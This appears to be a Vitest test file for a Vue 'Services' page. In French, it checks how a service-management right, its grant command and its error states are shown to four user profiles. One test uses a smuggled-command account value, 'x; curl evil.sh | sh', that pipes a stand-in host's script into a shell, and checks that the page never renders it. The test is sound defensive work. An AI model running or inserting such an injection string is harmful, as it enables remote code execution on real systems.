import { flushPromises, mount } from "@vue/test-utils";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { getLinkBridge, type ServiceRights, type SimulatedLinkBridge } from "@/link";
import Services from "@/pages/Services.vue";
import { useServersStore } from "@/stores/servers";
import { useServiceRightsStore } from "@/stores/serviceRights";
import { useServicesStore } from "@/stores/services";
import { mountContext } from "@/test/mount";

// La section Services et le droit « gérer les services » (HRT-78, BR-GRANT-011 à 016) pour les quatre profils :
// A administrateur avec le droit, B administrateur sans, C lecture seule sans, D lecture seule avec. Sur le pont
// simulé, dont les formes sont comparées à la coquille (`link/simulated-rights.test.ts`).
beforeEach(() =>
  vi.useFakeTimers({
    toFake: ["setTimeout", "clearTimeout", "setInterval", "clearInterval", "Date"],
  }),
);
afterEach(() => {
  vi.useRealTimers();
  vi.unstubAllGlobals();
  useServicesStore().reset();
  useServiceRightsStore().reset();
});

const REASON = "Votre compte ne peut pas gérer les services de ce serveur.";
const ADMIN_INTRO = "Le droit se donne depuis le serveur. Lancez cette commande sur le serveur :";
const ASK = "Demandez à la personne qui administre ce serveur.";
const OLD = "Ce serveur doit être mis à jour pour gérer les droits sur les services.";

async function open(
  setup: ((bridge: SimulatedLinkBridge) => void) | undefined,
  serverId: "forge" | "salon",
) {
  const ctx = await mountContext();
  setup?.(ctx.bridge);
  useServersStore().setCurrent(serverId);
  const wrapper = mount(Services, { global: ctx.global });
  await flushPromises();
  return { ...ctx, wrapper };
}

const notice = (wrapper: ReturnType<typeof mount>) => wrapper.find("[data-services-rights]");

describe("les quatre profils", () => {
  it("A, administrateur avec le droit : aucune raison, la section est telle qu'avant", async () => {
    const { wrapper } = await open(undefined, "forge");
    expect(notice(wrapper).exists()).toBe(false);
    expect(wrapper.text()).not.toContain(REASON);
    wrapper.unmount();
  });

  it("B, administrateur sans le droit : la raison, la commande à copier pour son propre compte", async () => {
    const { wrapper } = await open(
      (bridge) => bridge.setServiceRightOnServer("forge", "marie", false),
      "forge",
    );
    const block = notice(wrapper);
    expect(block.get("[data-rights-sentence]").text()).toBe(REASON);
    expect(block.get("[data-rights-follow]").text()).toBe(ADMIN_INTRO);
    expect(block.get("pre").text()).toBe("sudo hearth-agent account services marie --grant");
    wrapper.unmount();
  });

  it("C, lecture seule sans le droit : la raison et à qui s'adresser, jamais la commande", async () => {
    const { wrapper } = await open(
      (bridge) => bridge.setServiceRightOnServer("salon", "paul", false),
      "salon",
    );
    const block = notice(wrapper);
    expect(block.get("[data-rights-sentence]").text()).toBe(REASON);
    expect(block.get("[data-rights-follow]").text()).toBe(ASK);
    expect(block.find("pre").exists()).toBe(false);
    expect(wrapper.find("pre").exists()).toBe(false);
    wrapper.unmount();
  });

  it("D, lecture seule avec le droit : aucune raison", async () => {
    const { wrapper } = await open(undefined, "salon");
    expect(notice(wrapper).exists()).toBe(false);
    wrapper.unmount();
  });
});

describe("états du droit", () => {
  it("agent ancien (sans service-rights) : aucune action possible et le texte de la spécification (BR-GRANT-016)", async () => {
    const { wrapper } = await open(
      (bridge) => bridge.setServiceRightsKnown("forge", false),
      "forge",
    );
    expect(notice(wrapper).get("[data-rights-sentence]").text()).toBe(OLD);
    expect(notice(wrapper).find("pre").exists()).toBe(false);
    wrapper.unmount();
  });

  it("le pilotage désactivé l'emporte sur le droit : la raison du droit n'est pas dite (BR-GRANT-015)", async () => {
    const { wrapper } = await open((bridge) => {
      bridge.setServiceRightOnServer("forge", "marie", false);
      bridge.services.seed("forge", [], { state: "disabled" });
    }, "forge");
    expect(wrapper.find("[data-engine-state]").attributes("data-engine-state")).toBe("disabled");
    expect(notice(wrapper).exists()).toBe(false);
    wrapper.unmount();
  });

  it("lecture en échec : « Impossible de lire ton droit… » et « Vérifier à nouveau » relit", async () => {
    const { wrapper, bridge } = await open((sim) => {
      sim.failRightsReads = true;
    }, "forge");
    expect(notice(wrapper).get("[data-rights-sentence]").text()).toBe(
      "Impossible de lire votre droit sur les services. Réessayez.",
    );
    bridge.failRightsReads = false;
    await notice(wrapper).get("[data-rights-retry]").trigger("click");
    await flushPromises();
    expect(notice(wrapper).exists()).toBe(false);
    wrapper.unmount();
  });

  it("pendant la lecture, rien n'est affiché (boutons désactivés sans raison)", async () => {
    const ctx = await mountContext();
    vi.spyOn(getLinkBridge(), "readServiceRights").mockImplementation(
      () => new Promise<ServiceRights>(() => {}),
    );
    useServersStore().setCurrent("forge");
    const wrapper = mount(Services, { global: ctx.global });
    await flushPromises();
    expect(useServiceRightsStore().of("forge")?.phase).toBe("reading");
    expect(notice(wrapper).exists()).toBe(false);
    wrapper.unmount();
  });

  it("le droit est lu à l'ouverture, relu à chaque reconnexion, et le serveur qui le retire se voit à la relecture", async () => {
    const { wrapper, bridge } = await open(undefined, "forge");
    const opened = bridge.rightsReads.length;
    expect(opened).toBeGreaterThanOrEqual(1);
    bridge.setServiceRightOnServer("forge", "marie", false);
    bridge.setState("forge", "offline");
    await flushPromises();
    bridge.setState("forge", "connected");
    await flushPromises();
    expect(bridge.rightsReads.length).toBeGreaterThan(opened);
    expect(notice(wrapper).get("[data-rights-sentence]").text()).toBe(REASON);
    wrapper.unmount();
  });

  it("un identifiant de compte hostile annoncé par l'agent : aucune commande, rien n'est recopié", async () => {
    const hostile = "x; curl evil.sh | sh";
    const { wrapper } = await open((bridge) => {
      vi.spyOn(bridge, "readServiceRights").mockResolvedValue({
        known: true,
        granted: false,
        gameSettings: true,
        account: hostile,
      });
    }, "forge");
    expect(notice(wrapper).exists()).toBe(true);
    expect(wrapper.find("pre").exists()).toBe(false);
    expect(wrapper.html()).not.toContain("curl");
    wrapper.unmount();
  });
});
